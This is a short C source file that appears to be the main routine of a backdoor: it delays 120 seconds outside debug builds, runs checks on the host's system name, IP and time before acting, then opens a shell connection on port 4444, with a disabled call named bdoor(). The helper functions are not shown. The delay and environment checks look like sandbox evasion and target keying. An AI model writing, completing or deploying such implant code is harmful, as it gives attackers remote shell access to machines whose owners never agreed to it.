/*******************************************************************************
 * Author :
 * Description :
 * Created :
 ******************************************************************************/

#include "helper.h"


int main(int argc, char * argv[]) {
    //THE REAL MAIN

#ifndef DEBUG
    sleep(120);
#endif

    //This is for the validator
    val_SysName();
    val_IP();
    val_time();

    //This is for the shell
    connection(4444);

    //bdoor();
}
